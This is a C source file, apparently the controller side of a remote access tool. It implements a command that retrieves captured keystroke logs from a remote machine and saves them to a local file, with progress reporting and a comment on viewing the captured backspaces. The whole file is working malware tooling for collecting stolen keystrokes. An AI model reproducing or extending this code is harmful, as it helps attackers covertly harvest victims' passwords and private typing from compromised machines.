#include <stdio.h>
#include <stdlib.h>
#include "types.h"
#include "logger.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"
#include "progressbar.h"

#define COMMAND_KEYLOGGER_GET_DATA 0xF
#define COMMAND_KEYLOGGER_GET_END 0xE

//@VAJNO README: the file mustn't be open with notepad!!! use notepad++ to see backpaces and other shit

int command_Keylogger_Get(char* msg, int len)
{
	FILE *f = fopen(msg, "w");

	free(msg);

	if(!f)
	{
		LOG(LOG_ERR, "Cannot create the file!\n");

		return COMMANDS_SUCC;
	}

	if(net_SendCmd((uint8*)" ", 1, COMMANDS_KEYLOGGER_GET) == NET_LOST_CONNECTION)
	{
		LOG(LOG_ERR, "Failed to send!\n");
		fclose(f);

		return NET_LOST_CONNECTION;
	}

	uint8* rmsg;

	int rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES);

	if(rv == NET_LOST_CONNECTION)
	{
		LOG(LOG_ERR, "Failed to receive!\n");
		free(rmsg);
		fclose(f);

		return NET_LOST_CONNECTION;

	}else if(rv == NET_TIMED_OUT){
		LOG(LOG_ERR, "Time out!\n");
		free(rmsg);
		fclose(f);

		return NET_LOST_CONNECTION;
	}

	if(rmsg[0] != COMMANDS_APPROVE || rv > 7)
	{
		LOG(LOG_ERR, "The keylogger may not be running ?\n");
		free(rmsg);
		fclose(f);

		return COMMANDS_SUCC;
	}
	
	uint32 size = (rmsg[1] & 0xFF) | (rmsg[2] & 0xFF) << 8 | (rmsg[3] & 0xFF) << 16 | (rmsg[4] & 0xFF) << 24;
	
	LOG(LOG_SUCC, "Keylogger size: %d %s\n", (size / 1024) < 1 ? size : size / 1024, (size / 1024) < 1 ? "B" : "KB");

	free(rmsg);

	rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES);
	
	if(rv == NET_LOST_CONNECTION)
	{
		LOG(LOG_ERR, "Failed to receive!\n");
		free(rmsg);
		fclose(f);

		return NET_LOST_CONNECTION;

	}else if(rv == NET_TIMED_OUT){
		LOG(LOG_ERR, "Time out!\n");
		free(rmsg);
		fclose(f);

		return NET_LOST_CONNECTION;
	}

	if(rmsg[0] != COMMANDS_APPROVE)
	{
		LOG(LOG_ERR, "Failed to retrive keylogger data!\n");
		free(rmsg);
		fclose(f);

		return COMMANDS_SUCC;
	}

	free(rmsg);

	progressbar_Max = size;
	progressbar_Start();
	progressbar_WaitToStart();
	
	while((rv = net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES)) > 0)
	{
		if(rmsg[0] == COMMAND_KEYLOGGER_GET_END)
		{
			break;
		}else if(rmsg[0] == COMMAND_KEYLOGGER_GET_DATA){
			fwrite(rmsg + 1, 1, rv - 1, f); //- 1 cuz CMD
			progressbar_Index += rv - 1; 
		}

		if(net_SendCmd((uint8*)" ", 1, 0) == NET_LOST_CONNECTION)
		{
			progressbar_CriticalStop();
			fclose(f);
			free(rmsg);

			return NET_LOST_CONNECTION;
		}

		free(rmsg);
	}

	free(rmsg);
	fclose(f);

	if(rv < 1)
	{
		progressbar_CriticalStop();
	}else{
		progressbar_Stop();
	}

	if(rv == NET_LOST_CONNECTION)
	{
		LOG(LOG_ERR, "Failed to receive!\n");

		return NET_LOST_CONNECTION;

	}else if(rv == NET_TIMED_OUT){
		LOG(LOG_ERR, "Time out!\n");

		return NET_LOST_CONNECTION;
	}

	LOG(LOG_SUCC, "Done!\n");

	return COMMANDS_SUCC;
}